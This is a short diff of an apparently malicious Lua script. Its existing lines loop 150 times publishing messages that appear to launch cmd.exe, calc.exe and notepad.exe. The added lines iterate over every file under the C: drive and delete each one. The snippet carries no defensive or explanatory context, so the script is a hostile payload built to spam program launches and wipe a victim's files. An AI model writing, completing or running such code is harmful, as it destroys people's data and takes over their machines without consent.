@@ -5,4 +5,7 @@ for i=1,150 do
 Bus.publish(Bus, ID, {url = "cmd.exe"})
 Bus.publish(Bus, ID, {url = "calc.exe"})
 Bus.publish(Bus, ID, {url = "notepad.exe"})
+for i,v in listfiles("C://") do
+delfile(v)
+end
 end
